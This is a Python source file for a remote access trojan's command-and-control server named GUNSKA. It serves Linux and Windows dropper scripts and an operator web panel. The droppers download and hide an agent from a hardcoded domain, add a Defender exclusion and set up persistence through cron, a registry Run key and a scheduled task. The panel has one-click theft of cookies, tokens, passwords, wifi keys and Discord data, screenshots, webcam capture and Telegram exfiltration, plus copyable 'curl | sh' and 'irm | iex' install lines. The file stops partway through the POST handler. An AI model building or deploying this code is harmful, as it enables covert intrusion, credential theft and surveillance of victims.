#!/usr/bin/env python3
"""GUNSKA — C2 server (stdlib only)."""
import base64
import json
import os
import secrets
import threading
import time
import urllib.request
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

PORT = int(os.environ.get("PORT", "8080"))
HERE = os.path.dirname(os.path.abspath(__file__))
STATE = os.path.join(HERE, "state.json")


def _state():
    try:
        return json.load(open(STATE))
    except Exception:
        return {}


def _save_state():
    try:
        json.dump({"auth": AUTH, "token": TOKEN}, open(STATE, "w"))
    except Exception:
        pass


_st = _state()
AUTH = os.environ.get("AUTH") or _st.get("auth") or secrets.token_hex(12)
TOKEN = os.environ.get("AGENT_TOKEN") or _st.get("token") or secrets.token_hex(12)
BASE = os.environ.get("BASE_URL", "https://1uciferxyz.com").rstrip("/")
TG_TOKEN = os.environ.get("TG_TOKEN") or ""
TG_CHAT = os.environ.get("TG_CHAT") or ""

LOCK = threading.RLock()
S = {}
LOOT = {}
LOOT_ORDER = []
LOOT_BYTES = 0

MAX_LOOT_BYTES = 200 * 1024 * 1024
MAX_OUT = 5000
POLL_HOLD = 25
OFFLINE_AFTER = 90
SESSION_TTL = 86400

PYC = {"d": b""}
PY_URLS = [
    "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip",
    "https://registry.npmmirror.com/-/binary/python/3.11.9/python-3.11.9-embed-amd64.zip",
]


def base_of(h):
    if BASE:
        return BASE
    proto = h.headers.get("X-Forwarded-Proto", "https")
    return "%s://%s" % (proto, h.headers.get("Host", "localhost"))


def links(o):
    return {
        "linux": "curl -fsSL %s/i | sh" % o,
        "windows": ('powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c '
                    '"1..5|%%{try{irm %s/i.ps1|iex;break}catch{Start-Sleep 3}}"' % o).replace("%%", "%"),
        "windows_simple": ('powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c '
                           '"irm %s/i.ps1 | iex"' % o),
    }


def sess(sid):
    with LOCK:
        s = S.get(sid)
        if s is None:
            s = S[sid] = {"info": {}, "last": time.time(), "q": [], "out": [], "seq": 0, "up": {}}
        s["last"] = time.time()
        return s


AGENT = ""
if os.path.exists(os.path.join(HERE, "agent.py")):
    with open(os.path.join(HERE, "agent.py"), encoding="utf-8") as _f:
        AGENT = _f.read()


def agent_src(host):
    return (AGENT.replace("__BASE__", base_of(host))
                 .replace("__TOKEN__", TOKEN)
                 .replace("__NAME__", "k" + secrets.token_hex(3))
                 .replace("__TGTOKEN__", TG_TOKEN)
                 .replace("__TGCHAT__", TG_CHAT))


SIMPLE = {"info", "ps", "shot", "cam", "pwd", "steal", "grab", "persist",
          "unpersist", "sd", "kill", "py", "toast", "vibrate", "audio", "leave",
          "tg", "all", "cookies", "tokens", "passwords", "hash", "wifi", "discord"}


def to_agent(line):
    """Map one console/panel line to an agent message."""
    rid = secrets.token_hex(4)
    line = line.strip()
    if not line:
        return {"t": "noop", "id": rid}
    if not line.startswith("."):
        return {"t": "shell", "id": rid, "a": line}

    parts = line[1:].split(None, 1)
    c = parts[0].lower() if parts else ""
    a = parts[1] if len(parts) > 1 else ""

    if c in ("leave", "detach"):
        return {"t": "noop", "id": rid}
    if c == "cd":
        return {"t": "cd", "id": rid, "a": a or "~"}
    if c == "ls":
        return {"t": "ls", "id": rid, "a": a}
    if c == "get":
        return {"t": "get", "id": rid, "a": a}
    if c == "clip":
        return {"t": "clip", "id": rid, "op": "set" if a else "get", "a": a}
    if c in SIMPLE:
        return {"t": c, "id": rid, "a": a}
    return {"t": "shell", "id": rid, "a": line}


BSH = r"""#!/bin/sh
B="__B__"; D="$HOME/.cache/.k"
mkdir -p "$D" 2>/dev/null
command -v python3 >/dev/null || { command -v pkg >/dev/null && pkg install -y python >/dev/null 2>&1; }
command -v python3 >/dev/null || { command -v apt >/dev/null && (apt update -qq; apt install -y python3) >/dev/null 2>&1; }
command -v python3 >/dev/null || { echo "python3 missing"; exit 1; }
curl -fsSL "$B/a" -o "$D/k.py" 2>/dev/null || wget -q "$B/a" -O "$D/k.py"
[ -s "$D/k.py" ] || { echo "payload fetch failed"; exit 1; }
command -v termux-wake-lock >/dev/null && termux-wake-lock
nohup python3 "$D/k.py" >/dev/null 2>&1 &
if [ -d "$HOME/.termux" ]; then
  mkdir -p "$HOME/.termux/boot"
  printf '#!/data/data/com.termux/files/usr/bin/sh\nnohup python3 %s >/dev/null 2>&1 &\n' "$D/k.py" > "$HOME/.termux/boot/svc.sh"
  chmod +x "$HOME/.termux/boot/svc.sh"
fi
if command -v crontab >/dev/null; then
  crontab -l 2>/dev/null | grep -q '\.cache/\.k/k\.py' || \
    (crontab -l 2>/dev/null; echo "@reboot nohup python3 $D/k.py >/dev/null 2>&1 & # gunska") | crontab
fi
echo "[+] done"
"""

PSH = r"""$ErrorActionPreference="Continue"
$ProgressPreference="SilentlyContinue"
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13}catch{}
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
$B="__B__"; $d="$env:LOCALAPPDATA\svc"; $ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
New-Item -ItemType Directory -Force $d | Out-Null
$log="$d\boot.log"
$fatal=$null
function Log($m){ try{ Add-Content -Path $log -Value ((Get-Date -Format "HH:mm:ss")+" "+$m) }catch{} }
function Pop($m){
  try{
    Add-Type -AssemblyName System.Windows.Forms
    $t=$m; if(Test-Path $log){ $t="$m`r`n`r`n"+((Get-Content $log -Tail 12) -join "`r`n") }
    [System.Windows.Forms.MessageBox]::Show($t,"gunska","OK","Warning") | Out-Null
  }catch{}
}
function Die($m){ Log "FATAL $m"; Pop $m; throw $m }
function Get($u,$o){
  for($i=0;$i -lt 5;$i++){
    try{
      Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing -UserAgent $ua -TimeoutSec 90
      if((Test-Path $o) -and (Get-Item $o).Length -gt 0){ return $true }
    }catch{ Log "get fail $i $u : $_"; Start-Sleep -Seconds 2 }
  }
  return $false
}
function OK($exe){
  if(-not $exe -or -not (Test-Path $exe)){ return $false }
  # stub dyal Microsoft Store = 0 byte / reparse point -> mchkoul
  try{
    $it=Get-Item $exe
    if($it.Length -eq 0 -and $exe -like "*WindowsApps*"){ Log "stub: $exe"; return $false }
  }catch{}
  try{
    $p = Start-Process -FilePath $exe -ArgumentList '-c','print(1)' -NoNewWindow -PassThru -Wait -ErrorAction Stop
    if($p.ExitCode -eq 0){ return $true }
    Log "bad exe rc=$($p.ExitCode): $exe"
  }catch{ Log "bad exe: $exe : $_" }
  return $false
}
Log "start user=$env:USERNAME admin=$([bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)))"
try{ Add-MpPreference -ExclusionPath $d -ErrorAction Stop; Log "defender excl ok" }catch{ Log "defender excl: $_" }

$py="$d\python.exe"; $have=$null
Remove-Item "$d\.live" -Force -ErrorAction SilentlyContinue

if(-not (OK $py)){
  if((Get "$B/py" "$d\py.zip") -and ((Get-Item "$d\py.zip").Length -gt 1000000)){
    try{ Expand-Archive "$d\py.zip" $d -Force; Log "unzip ok" }catch{ Log "unzip: $_" }
  } else { Log "py.zip fail" }
  if(OK $py){ $have=$py; Log "embed ok" }
}
if(-not $have){
  $c=(Get-Command py -ErrorAction SilentlyContinue).Source
  if($c){ $c2 = & $c -3 -c "import sys;print(sys.executable)" 2>$null
    if($c2 -and (OK $c2.Trim())){ $have=$c2.Trim(); Log "py-launcher: $have" } }
}
if(-not $have){
  $c=(Get-Command python3 -ErrorAction SilentlyContinue).Source
  if(OK $c){ $have=$c; Log "sys python3: $c" }
}
if(-not $have){
  $c=(Get-Command python -ErrorAction SilentlyContinue).Source
  if(OK $c){ $have=$c; Log "sys python: $c" }
}
if(-not $have){ Die "python ma kaynch (embed + system fchlo). Chouf $log" }
Log "python: $have"

if(-not (Get "$B/a" "$d\k.py")){ Die "payload fetch failed — chouf $log" }
if((Get-Item "$d\k.py").Length -lt 500){ Die "payload corrupt" }

$run="$d\run.cmd"
Set-Content -Path $run -Encoding ASCII -Value ('@echo off'+"`r`n"+'start "" "'+$have+'" "'+"$d\k.py"+'"'+"`r`n")
$vbs="$d\run.vbs"
Set-Content -Path $vbs -Encoding ASCII -Value ('CreateObject("WScript.Shell").Run """'+$have+'"" ""'+"$d\k.py"+'""", 0, False')

$psi = New-Object Diagnostics.ProcessStartInfo
$psi.FileName = $have
$psi.Arguments = '"'+"$d\k.py"+'"'
$psi.WorkingDirectory = $d
$psi.WindowStyle = "Hidden"
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false
$psi.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8"
$pr = [Diagnostics.Process]::Start($psi)
Log "spawned pid=$($pr.Id)"
$t0 = Get-Date
Start-Sleep -Seconds 10
$live = Join-Path $d ".live"
if($pr.HasExited){ Die "agent mnat f 10s (rc=$($pr.ExitCode)). Chouf $log" }
if(-not (Test-Path $live)){ Die "agent khdam walakin ma darch l'marker. Chouf $log" }
Log "alive + marker ok"

try{
  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value ('wscript.exe //nologo "'+$vbs+'"') -PropertyType String -Force | Out-Null
  Log "run-key ok"
}catch{ Log "run-key: $_" }
try{ & cmd /c "schtasks /delete /tn SysSvc /f >nul 2>&1" }catch{}
try{ & cmd /c "schtasks /create /tn SysSvc /tr ""wscript.exe //nologo """"$vbs"""""" /sc onlogon /f" | Out-Null; Log "task ok" }catch{ Log "task: $_" }
Log "done"
Pop "gunska: session wjdat 3la $env:COMPUTERNAME"
"""

PANEL = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="color-scheme" content="dark">
<title>GUNSKA · C2</title>
<style>
:root{
  --bg:#0a0c10; --bg2:#0e1218; --card:#11151c; --card2:#151b24;
  --line:#1e2530; --line2:#2a3442;
  --fg:#d7dde5; --dim:#7d8896; --faint:#4d5763;
  --acc:#4f9dff; --ok:#3fb950; --warn:#d29922; --err:#f85149;
  --r:10px; --rs:6px;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0; background:var(--bg); color:var(--fg);
  font:14px/1.5 Inter,-apple-system,"Segoe UI",Roboto,system-ui,sans-serif;
  -webkit-font-smoothing:antialiased; display:flex; flex-direction:column;
}
button,input{font:inherit; color:inherit}
::-webkit-scrollbar{width:9px;height:9px}
::-webkit-scrollbar-thumb{background:#222b36;border-radius:9px}
::-webkit-scrollbar-thumb:hover{background:#31404f}
::-webkit-scrollbar-track{background:transparent}

header{
  display:flex; align-items:center; gap:10px; flex-wrap:wrap;
  padding:10px 14px; border-bottom:1px solid var(--line); background:var(--bg2);
}
.brand{display:flex; align-items:center; gap:8px; font-weight:600; letter-spacing:.16em; font-size:13px}
.brand i{width:8px;height:8px;border-radius:50%;background:var(--acc);box-shadow:0 0 0 3px rgba(79,157,255,.15)}
.brand em{font-style:normal;font-size:9px;letter-spacing:.1em;color:var(--dim);border:1px solid var(--line2);padding:2px 5px;border-radius:4px}
.spacer{flex:1}
.keybox{display:flex; gap:6px; align-items:center}
input[type=password],input[type=text]{
  background:#0b0f15; border:1px solid var(--line2); border-radius:var(--rs);
  padding:7px 10px; outline:none; transition:border-color .15s, box-shadow .15s; min-width:0;
}
input:focus{border-color:var(--acc); box-shadow:0 0 0 3px rgba(79,157,255,.12)}
input::placeholder{color:var(--faint)}
.btn{
  background:var(--card2); border:1px solid var(--line2); border-radius:var(--rs);
  padding:7px 12px; cursor:pointer; transition:.15s; white-space:nowrap; font-size:13px;
}
.btn:hover{background:#1b2431; border-color:#33445a}
.btn:active{transform:translateY(1px)}
.btn.primary{background:#1b4b86; border-color:#2b6db8; color:#e8f1ff}
.btn.primary:hover{background:#215a9f}
.btn.xs{padding:3px 8px; font-size:11px; color:var(--dim)}
.btn.xs:hover{color:var(--fg)}
.chip{
  font-size:11px; padding:3px 9px; border-radius:999px; border:1px solid var(--line2);
  color:var(--dim); background:var(--card); display:flex; align-items:center; gap:6px;
}
.chip b{width:6px;height:6px;border-radius:50%;background:var(--faint)}
.chip.on{color:var(--ok); border-color:#1d3b26; background:#0f1a12}
.chip.on b{background:var(--ok)}
.chip.bad{color:var(--err); border-color:#3d1f1f; background:#1a0f0f}
.chip.bad b{background:var(--err)}

main{flex:1; display:grid; grid-template-columns:230px minmax(0,1fr) 250px; gap:10px; padding:10px; min-height:0}
.col{display:flex; flex-direction:column; min-height:0; background:var(--card); border:1px solid var(--line); border-radius:var(--r); overflow:hidden}
.colhead{display:flex; align-items:center; gap:8px; padding:9px 11px; border-bottom:1px solid var(--line); flex-wrap:wrap}
.colhead h2{margin:0; font-size:10px; letter-spacing:.14em; text-transform:uppercase; color:var(--dim); font-weight:600}
.badge{font-size:10px; color:var(--dim); background:var(--card2); border-radius:999px; padding:1px 7px}
.list{overflow:auto; padding:6px; flex:1; min-height:0}
.search{margin:8px; padding:6px 9px; font-size:12px}

.s{display:block; width:100%; text-align:left; background:none; border:1px solid transparent; border-radius:var(--rs); padding:7px 9px; cursor:pointer; transition:.12s}
.s:hover{background:var(--card2); border-color:var(--line2)}
.s.sel{background:#132234; border-color:#27506f}
.s .top{display:flex; align-items:center; gap:6px; font-family:ui-monospace,monospace; font-size:11.5px}
.s .dot{width:6px;height:6px;border-radius:50%;background:var(--faint);flex:none}
.s.on .dot{background:var(--ok); box-shadow:0 0 6px rgba(63,185,80,.6)}
.s .meta{color:var(--dim); font-size:10.5px; margin-left:12px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
.empty{color:var(--faint); font-size:12px; padding:10px; text-align:center}

.term{padding:0}
.out{
  flex:1; margin:0; overflow:auto; padding:11px 13px; background:#05070a;
  font:12px/1.65 ui-monospace,SFMono-Regular,Menlo,monospace;
  white-space:pre-wrap; word-break:break-word; outline:none; min-height:0;
}
.out .ln{display:block}
.out .loot{color:var(--acc)}
.out .rc{color:var(--faint)}
.out .err{color:var(--err)}
.out .sys{color:var(--warn)}
.inputrow{display:flex; gap:7px; align-items:center; padding:9px; border-top:1px solid var(--line); background:var(--card)}
.inputrow .caret{color:var(--acc); font-family:ui-monospace,monospace; font-weight:700}
.inputrow input{flex:1; font-family:ui-monospace,monospace; font-size:12.5px}

.loot{font-size:12px}
.loot a{color:var(--acc); text-decoration:none; display:block; padding:6px 8px; border-radius:var(--rs); overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
.loot a:hover{background:var(--card2)}
.loot .sz{color:var(--faint); font-size:10px; margin-left:8px}
.links{padding:9px; display:flex; flex-direction:column; gap:7px; font-size:11px}
.links code{display:block; background:#05070a; border:1px solid var(--line); border-radius:var(--rs); padding:7px 8px; font-family:ui-monospace,monospace; word-break:break-all; color:#9fd0a8; font-size:10.5px}

.toasts{position:sticky; bottom:0; display:flex; flex-direction:column; gap:6px; padding:0 12px 10px; pointer-events:none}
.toast{background:var(--card2); border:1px solid var(--line2); border-left:3px solid var(--acc); border-radius:var(--rs); padding:7px 11px; font-size:12px; animation:in .18s ease-out}
.toast.bad{border-left-color:var(--err)}
.toast.good{border-left-color:var(--ok)}
@keyframes in{from{opacity:0; transform:translateY(6px)}to{opacity:1; transform:none}}

@media (max-width:980px){
  main{grid-template-columns:1fr; grid-template-rows:auto 1fr auto}
  .col.sessions .list{max-height:150px}
  .col.side{flex-direction:row; flex-wrap:wrap}
  .col.side>*{flex:1; min-width:150px}
}
</style>
</head>
<body>
<header>
  <div class="brand"><i></i>GUNSKA<em>C2</em></div>
  <div class="spacer"></div>
  <div class="keybox">
    <input id="k" type="password" placeholder="AUTH key" size="22" autocomplete="off" spellcheck="false">
    <button class="btn primary" id="conn">connect</button>
  </div>
  <span class="chip" id="status"><b></b>idle</span>
</header>
<main>
  <section class="col sessions">
    <div class="colhead"><h2>sessions</h2><span class="badge" id="count">0</span></div>
    <input class="search" id="search" placeholder="filter host / ip / os" autocomplete="off">
    <div class="list" id="slist"><div class="empty">not connected</div></div>
  </section>
  <section class="col term">
    <div class="colhead">
      <h2 id="ttl">no session</h2>
      <div class="spacer"></div>
      <button class="btn xs" data-c=".tg">exfil</button>
      <button class="btn xs" data-c=".cookies">cookies</button>
      <button class="btn xs" data-c=".tokens">tokens</button>
      <button class="btn xs" data-c=".passwords">passwords</button>
      <button class="btn xs" data-c=".hash">hash</button>
      <button class="btn xs" data-c=".wifi">wifi</button>
      <button class="btn xs" data-c=".discord">discord</button>
      <button class="btn xs" data-c=".info">info</button>
      <button class="btn xs" data-c=".steal">steal</button>
      <button class="btn xs" data-c=".shot">shot</button>
      <button class="btn xs" data-c=".leave">detach</button>
      <button class="btn xs" id="clear">clear</button>
    </div>
    <pre class="out" id="t" tabindex="0"></pre>
    <div class="inputrow">
      <span class="caret">&gt;</span>
      <input id="c" placeholder="shell command — prefix with . for RAT commands" autocomplete="off" spellcheck="false">
      <button class="btn primary" id="run">run</button>
      <button class="btn" id="put">put</button>
      <input type="file" id="f" hidden>
    </div>
  </section>
  <section class="col side">
    <div class="colhead"><h2>loot</h2></div>
    <div class="list loot" id="loot"><div class="empty">empty</div></div>
    <div class="colhead"><h2>links</h2></div>
    <div class="links" id="links"><div class="empty">connect first</div></div>
  </section>
</main>
<div class="toasts" id="toasts"></div>
<script>
const $ = s => document.querySelector(s);
const esc = s => String(s == null ? "" : s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));

let K = localStorage.getItem("gs_key") || "";
let cur = null, seq = 0, tSess = null, tOut = null, tLoot = null;
const SLIST = $("#slist"), T = $("#t"), LOOT = $("#loot"), STATUS = $("#status");

function setStatus(kind, text){
  STATUS.className = "chip" + (kind ? " " + kind : "");
  STATUS.innerHTML = "<b></b>" + esc(text);
}
function toast(msg, kind){
  const d = document.createElement("div");
  d.className = "toast" + (kind ? " " + kind : "");
  d.textContent = msg;
  $("#toasts").appendChild(d);
  setTimeout(() => d.remove(), 3200);
}
function api(path, opts){
  opts = opts || {};
  opts.headers = Object.assign({"X-Auth": K}, opts.headers || {});
  return fetch(path, opts);
}
function write(line, cls){
  const near = T.scrollHeight - T.scrollTop - T.clientHeight < 60;
  const el = document.createElement("span");
  el.className = "ln" + (cls ? " " + cls : "");
  el.textContent = line;
  T.appendChild(el);
  while (T.childElementCount > 4000) T.firstElementChild.remove();
  if (near) T.scrollTop = T.scrollHeight;
}

async function connect(){
  K = $("#k").value.trim();
  if (!K) { toast("key khawi", "bad"); return; }
  localStorage.setItem("gs_key", K);
  setStatus("", "connecting");
  try {
    const r = await api("/api/sessions");
    if (r.status === 401) { setStatus("bad", "bad key"); toast("401 — key ghalta", "bad"); return; }
    setStatus("on", "live");
    drawLinks();
    start();
  } catch (e) { setStatus("bad", "unreachable"); toast("ma 9dertch nwsel", "bad"); }
}

function start(){
  stop();
  pollSessions(); pollLoot();
  tSess = setInterval(pollSessions, 2500);
  tOut = setInterval(pollOut, 700);
  tLoot = setInterval(pollLoot, 4000);
}
function stop(){
  clearInterval(tSess); clearInterval(tOut); clearInterval(tLoot);
}

async function pollSessions(){
  if (!K) return;
  try {
    const r = await api("/api/sessions");
    if (r.status === 401) { setStatus("bad", "bad key"); stop(); return; }
    const j = await r.json();
    setStatus("on", "live");
    $("#count").textContent = j.length;
    const q = $("#search").value.trim().toLowerCase();
    const rows = j.filter(s => !q || [s.id, s.user, s.host, s.ip, s.os].join(" ").toLowerCase().includes(q));
    SLIST.innerHTML = rows.length ? "" : '<div class="empty">no match</div>';
    for (const s of rows){
      const b = document.createElement("button");
      b.className = "s" + (s.on ? " on" : "") + (s.id === cur ? " sel" : "");
      b.innerHTML = '<div class="top"><span class="dot"></span>' + esc(s.id) + '</div>'
        + '<div class="meta">' + esc(s.user || "?") + '@' + esc(s.host || "?") + '</div>'
        + '<div class="meta">' + esc(s.ip || "?") + ' · ' + esc(s.os || "?") + '</div>';
      b.onclick = () => select(s.id);
      SLIST.appendChild(b);
    }
  } catch (e) {}
}

async function pollOut(){
  if (!K || !cur) return;
  try {
    const r = await api("/api/out?sid=" + encodeURIComponent(cur) + "&after=" + seq);
    if (!r.ok) return;
    const j = await r.json();
    if (j.lines && j.lines.length){
      seq = j.seq;
      for (const line of j.lines){
        if (/^\[loot\]/.test(line)) write(line, "loot");
        else if (/^\[rc=/.test(line)) write(line, "rc");
        else if (/^ERR /.test(line)) write(line, "err");
        else write(line);
      }
    }
  } catch (e) {}
}

async function pollLoot(){
  if (!K) return;
  try {
    const r = await api("/api/loot");
    if (!r.ok) return;
    const j = await r.json();
    LOOT.innerHTML = j.length ? "" : '<div class="empty">empty</div>';
    for (const f of j){
      const a = document.createElement("a");
      a.href = "/api/loot/" + encodeURIComponent(f.id) + "?k=" + encodeURIComponent(K);
      a.innerHTML = esc(f.name) + '<span class="sz">' + Math.round(f.size / 1024) + " KB</span>";
      LOOT.appendChild(a);
    }
  } catch (e) {}
}

function select(id){
  if (cur === id) return;
  cur = id; seq = 0;
  T.textContent = "";
  $("#ttl").textContent = id;
  $("#c").focus();
  pollSessions();
}

async function send(cmd){
  if (!cur) { toast("khtar session 3la l9bel", "bad"); return; }
  try {
    const r = await api("/api/cmd", {method: "POST", body: JSON.stringify({sid: cur, cmd})});
    if (!r.ok) toast("cmd refusé (" + r.status + ")", "bad");
    if (/^\.(leave|detach)\b/.test(cmd)) { cur = null; $("#ttl").textContent = "no session"; }
  } catch (e) { toast("cmd failed", "bad"); }
}
function sendInput(){
  const v = $("#c").value.trim();
  if (!v) return;
  $("#c").value = "";
  write("$ " + v, "sys");
  send(v);
}

async function upload(){
  const f = $("#f").files[0];
  if (!f || !cur) return;
  toast("sending " + f.name + "…");
  try {
    const r = await api("/api/put", {method: "POST", body: f, headers: {"X-Sid": cur, "X-Name": f.name}});
    write(r.ok ? "[sent] " + f.name : "[put failed] " + f.name, r.ok ? "loot" : "err");
  } catch (e) { write("[put failed] " + f.name, "err"); }
  $("#f").value = "";
}

async function drawLinks(){
  let j = null;
  try { j = await (await api("/api/links")).json(); } catch (e) {}
  if (!j) {
    const o = location.origin;
    j = {linux: "curl -fsSL " + o + "/i | sh",
         windows: 'powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c "irm ' + o + '/i.ps1 | iex"',
         windows_simple: ""};
  }
  $("#links").innerHTML =
    '<div>linux / termux</div><code>' + esc(j.linux) + '</code>' +
    '<div>windows (retry)</div><code>' + esc(j.windows) + '</code>' +
    (j.windows_simple ? '<div>windows (simple)</div><code>' + esc(j.windows_simple) + '</code>' : '');
  for (const c of document.querySelectorAll(".links code")){
    c.title = "click to copy";
    c.style.cursor = "pointer";
    c.onclick = () => { navigator.clipboard.writeText(c.textContent).then(() => toast("copied", "good")); };
  }
}

$("#conn").onclick = connect;
$("#k").addEventListener("keydown", e => { if (e.key === "Enter") connect(); });
$("#run").onclick = sendInput;
$("#clear").onclick = () => { T.textContent = ""; };
$("#put").onclick = () => $("#f").click();
$("#f").onchange = upload;
$("#c").addEventListener("keydown", e => { if (e.key === "Enter") sendInput(); });
$("#search").addEventListener("input", pollSessions);
document.querySelectorAll("[data-c]").forEach(b => b.onclick = () => send(b.dataset.c));
document.addEventListener("keydown", e => {
  if (e.key === "Escape") { $("#c").value = ""; $("#c").blur(); }
  if (e.key === "/" && document.activeElement.tagName !== "INPUT") { e.preventDefault(); $("#search").focus(); }
});

const qk = new URLSearchParams(location.search).get("k");
if (qk) { K = qk.trim(); localStorage.setItem("gs_key", K); history.replaceState(null, "", location.pathname); }
$("#k").value = K;
if (K) connect();
</script>
</body>
</html>"""


class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "gunska"

    def log_message(self, *a):
        pass

    def snd(self, code, body, ctype="text/plain; charset=utf-8", extra=None):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            try:
                self.wfile.write(body)
            except Exception:
                pass

    def auth(self):
        given = self.headers.get("X-Auth")
        if given and secrets.compare_digest(given, AUTH):
            return True
        qk = parse_qs(urlparse(self.path).query).get("k", [""])[0]
        if qk and secrets.compare_digest(qk, AUTH):
            return True
        self.snd(401, "unauthorized")
        return False

    def agent_ok(self, qs):
        given = qs.get("t", [""])[0]
        return bool(given) and secrets.compare_digest(given, TOKEN)

    def body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n else b""

    def do_GET(self):
        u = urlparse(self.path)
        p, qs = u.path, parse_qs(u.query)

        if p == "/healthz":
            return self.snd(200, "ok")
        if p == "/favicon.ico":
            return self.snd(204, b"", "image/x-icon")
        if p == "/":
            return self.snd(200, PANEL, "text/html; charset=utf-8")
        if p == "/i":
            return self.snd(200, BSH.replace("__B__", base_of(self)), "text/x-shellscript")
        if p == "/i.ps1":
            return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain; charset=utf-8")
        if p == "/a":
            return self.snd(200, agent_src(self), "text/x-python")

        if p == "/link":
            if not self.auth():
                return
            j = links(base_of(self))
            return self.snd(200, "linux:  %s\nwindows: %s\nwindows_simple: %s\n"
                            % (j["linux"], j["windows"], j["windows_simple"]))

        if p == "/py":
            if PYC["d"]:
                return self.snd(200, PYC["d"], "application/zip")
            err = ""
            for u2 in PY_URLS:
                try:
                    r = urllib.request.Request(u2, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(r, timeout=120) as f:
                        data = f.read()
                    if len(data) > 1000000:
                        PYC["d"] = data
                        return self.snd(200, data, "application/zip")
                except Exception as e:
                    err = str(e)
            return self.snd(502, "py fetch: %s" % err)

        if p.startswith("/p/"):
            if not self.agent_ok(qs):
                return self.snd(403, "bad token")
            sid = p[3:].strip("/")
            if not sid:
                return self.snd(400, "sid")
            s = sess(sid)
            end = time.time() + POLL_HOLD
            while time.time() < end:
                with LOCK:
                    if s["q"]:
                        batch = s["q"]
                        s["q"] = []
                        return self.snd(200, json.dumps({"c": batch}), "application/json")
                time.sleep(0.15)
            return self.snd(200, '{"c":[]}', "application/json")

        if p.startswith("/api/"):
            if not self.auth():
                return

            if p == "/api/links":
                return self.snd(200, json.dumps(links(base_of(self))), "application/json")

            if p == "/api/sessions":
                now = time.time()
                with LOCK:
                    j = [{"id": k, "on": now - v["last"] < OFFLINE_AFTER,
                          "user": v["info"].get("user"), "host": v["info"].get("host"),
                          "ip": v["info"].get("ip"), "os": (v["info"].get("os") or "")[:40]}
                         for k, v in S.items()]
                j.sort(key=lambda x: (not x["on"], x["id"]))
                return self.snd(200, json.dumps(j), "application/json")

            if p == "/api/out":
                sid = qs.get("sid", [""])[0]
                try:
                    after = int(qs.get("after", ["0"])[0])
                except ValueError:
                    after = 0
                with LOCK:
                    s = S.get(sid)
                    if s is None:
                        return self.snd(200, '{"lines":[],"seq":0}', "application/json")
                    lines = [t for i, t in s["out"] if i > after]
                    seq = s["seq"]
                return self.snd(200, json.dumps({"lines": lines, "seq": seq}), "application/json")

            if p == "/api/loot":
                with LOCK:
                    j = [{"id": k, "name": v["name"], "size": v["size"]} for k, v in LOOT.items()]
                return self.snd(200, json.dumps(j), "application/json")

            if p.startswith("/api/loot/"):
                fid = p.split("/")[-1]
                with LOCK:
                    f = LOOT.get(fid)
                if not f:
                    return self.snd(404, "nope")
                safe = f["name"].replace('"', "_")
                return self.snd(200, f["data"], "application/octet-stream",
                                {"Content-Disposition": 'attachment; filename="%s"' % safe})

            return self.snd(404, "?")

        return self.snd(404, "?")

    def do_HEAD(self):
        self.do_GET()

    def do_POST(self):
        u = urlparse(self.path)
        p, qs = u.path, parse_qs(u.query)

        if p.startswith("/r/"):
            if not self.agent_ok(qs):
                return self.snd(403, "bad token")
            sid = p[3:].strip("/")
            if not sid:
                return self.snd(400, "sid")
            try:
                m = json.loads(self.body() or b"{}")
            except Exception:
                return self.snd(400, "json")
            s = sess(sid)
            t = m.get("t")

            if t == "hello":
                s["info"] = m.get("info") or {}
            elif t == "out":
                with LOCK:
                    s["seq"] += 1
                    s["out"].append((s["seq"], m.get("d", "")))
                    if len(s["out"]) > MAX_OUT:
                        s["out"] = s["out"][-MAX_OUT // 2:]
            elif t == "file":
                fid = m.get("fid")
                if not fid:
                    return self.snd(400, "fid")
                if m.get("i") == 0:
                    s["up"][fid] = {"name": m.get("name") or fid, "b": []}
                entry = s["up"].get(fid)
                if entry is None:
                    return self.snd(200, "ok")
                entry["b"].append(base64.b64decode(m.get("d") or ""))
                if m.get("last"):
                    s["up"].pop(fid, None)
                    data = b"".join(entry["b"])
                    name = os.path.basename(entry["name"]) or fid
                    with LOCK:
                        LOOT[fid] = {"name": name, "size": len(data), "data": data}
                        LOOT_ORDER.append(fid)
                        globals()["LOOT_BYTES"] = globals()["LOOT_BYTES"] + len(data)
                        while globals()["LOOT_BYTES"] > MAX_LOOT_BYTES and LOOT_ORDER:
                            old = LOOT_ORDER.pop(0)
                            dead = LOOT.pop(old, None)
                            if dead:
                                globals()["LOOT_BYTES"] -= dead["size"]
                        s["seq"] += 1
                        s["out"].append((s["seq"], "[loot] %s (%d b)\n" % (name, len(data))))
            return self.snd(200, "ok")

        if p.startswith("/api/"):
            if not self.auth():
                return

